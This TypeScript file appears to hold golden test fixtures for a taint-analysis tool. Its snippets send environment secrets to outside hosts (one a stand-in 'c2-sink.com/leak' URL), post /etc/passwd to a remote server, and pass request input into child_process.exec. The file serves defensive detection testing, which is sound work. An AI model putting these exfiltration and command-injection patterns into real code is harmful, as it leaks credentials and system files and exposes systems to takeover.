/**
 * Golden Fixtures for Dataflow / Taint Intelligence
 * P16 — Dataflow / Taint Intelligence
 */

export interface TaintFixtureScenario {
  name: string;
  description: string;
  files: Array<{ path: string; content: string }>;
  entrypoints?: string[];
  expected_sources: number;
  expected_sinks: number;
  expected_paths: number;
  expected_statuses: Array<'ACTIVE' | 'SANITIZED' | 'UNREACHABLE' | 'INDETERMINATE'>;
  expected_flow_classes?: string[];
}

export const TAINT_FIXTURE_SCENARIOS: Record<string, TaintFixtureScenario> = {
  // 1. Positive Direct Path (Credential -> Network)
  credential_to_network: {
    name: 'Positive Credential to Network Flow',
    description: 'Secret environment token read and transmitted over outbound HTTP fetch request.',
    files: [
      {
        path: 'src/exfil.ts',
        content: `
import fetch from 'node-fetch';

export async function sendTelemetry() {
  const secretKey = process.env.DATABASE_SECRET_KEY;
  const targetUrl = 'https://api.external-collector.net/telemetry?key=' + secretKey;
  await fetch(targetUrl);
}
`
      }
    ],
    expected_sources: 1,
    expected_sinks: 1,
    expected_paths: 1,
    expected_statuses: ['ACTIVE'],
    expected_flow_classes: ['POTENTIAL_SECRET_EGRESS'],
  },

  // 2. Sanitized Path (Secret -> Hash / Mask -> Network)
  sanitized_path: {
    name: 'Sanitized Secret Path via SHA256',
    description: 'API key hashed via crypto SHA256 before network egress.',
    files: [
      {
        path: 'src/auth.ts',
        content: `
import { sha256 } from './crypto_utils';
import fetch from 'node-fetch';

export async function verifyUser() {
  const rawApiKey = process.env.API_KEY;
  const safeDigest = sha256(rawApiKey);
  await fetch('https://auth.provider.com/verify?hash=' + safeDigest);
}
`
      }
    ],
    expected_sources: 1,
    expected_sinks: 1,
    expected_paths: 1,
    expected_statuses: ['SANITIZED'],
    expected_flow_classes: ['SANITIZED_DATAFLOW'],
  },

  // 3. Unreachable / Dead Code Path (Secret -> Dead Code Sink)
  unreachable_path: {
    name: 'Unreachable / Dead Code Taint Flow',
    description: 'Secret accessed, but network egress occurs after an unconditional return statement.',
    files: [
      {
        path: 'src/handler.ts',
        content: `
import fetch from 'node-fetch';

export function handleRequest() {
  const secret = process.env.AUTH_TOKEN;
  return { status: "OK" };
  
  // Unreachable dead code block
  fetch('https://c2-sink.com/leak?t=' + secret);
}
`
      }
    ],
    expected_sources: 1,
    expected_sinks: 1,
    expected_paths: 1,
    expected_statuses: ['UNREACHABLE'],
    expected_flow_classes: ['DEAD_CODE_DATAFLOW'],
  },

  // 4. Unresolved Dynamic Dispatch (Indeterminate Path)
  dynamic_dispatch: {
    name: 'Unresolved Dynamic Dispatch Taint Flow',
    description: 'Secret passed to a dynamically resolved object method subscript.',
    files: [
      {
        path: 'src/dispatcher.ts',
        content: `
export function routeEvent(dynHandler: string) {
  const userToken = process.env.SECRET_KEY;
  const dispatchTable: Record<string, any> = {};
  dispatchTable[dynHandler](userToken);
}
`
      }
    ],
    expected_sources: 1,
    expected_sinks: 0,
    expected_paths: 0,
    expected_statuses: [],
  },

  // 5. File to Network Exfiltration (Filesystem -> Network Egress)
  file_to_network: {
    name: 'Filesystem Ingestion to Network Egress',
    description: 'Sensitive /etc/passwd or local file read and sent via axios.',
    files: [
      {
        path: 'src/backup.ts',
        content: `
import fs from 'fs';
import axios from 'axios';

export async function backupConfig() {
  const fileData = fs.readFileSync('/etc/passwd', 'utf-8');
  await axios.post('https://remote-storage.io/upload', { data: fileData });
}
`
      }
    ],
    expected_sources: 2, // sensitive path + fs.readFileSync
    expected_sinks: 1,
    expected_paths: 1,
    expected_statuses: ['ACTIVE'],
    expected_flow_classes: ['POTENTIAL_FILE_EXFILTRATION'],
  },

  // 6. Process Argument Flow (User / Tool Input -> Shell Exec)
  process_argument_flow: {
    name: 'Input to Process Execution Flow',
    description: 'External argument passed into child_process.exec without parameterization.',
    files: [
      {
        path: 'src/runner.ts',
        content: `
import { exec } from 'child_process';

export function runUserCommand(req: any) {
  const rawInput = req.query.cmd;
  const fullCommand = 'sh -c ' + rawInput;
  exec(fullCommand);
}
`
      }
    ],
    expected_sources: 1,
    expected_sinks: 1,
    expected_paths: 1,
    expected_statuses: ['ACTIVE'],
    expected_flow_classes: ['POTENTIAL_COMMAND_INJECTION'],
  },

  // 7. Cross-File & Interprocedural Flow
  cross_file_flow: {
    name: 'Cross-File Interprocedural Taint Flow',
    description: 'Token read in config.ts, imported and passed to transmitter in network.ts.',
    files: [
      {
        path: 'src/config.ts',
        content: `
export const SECRET_TOKEN = process.env.API_KEY;
`
      },
      {
        path: 'src/network.ts',
        content: `
import { SECRET_TOKEN } from './config';
import fetch from 'node-fetch';

export async function syncState() {
  const activeToken = SECRET_TOKEN;
  await fetch('https://analytics.backend.com/sync?token=' + activeToken);
}
`
      }
    ],
    expected_sources: 1,
    expected_sinks: 1,
    expected_paths: 1,
    expected_statuses: ['ACTIVE'],
    expected_flow_classes: ['POTENTIAL_SECRET_EGRESS'],
  }
};
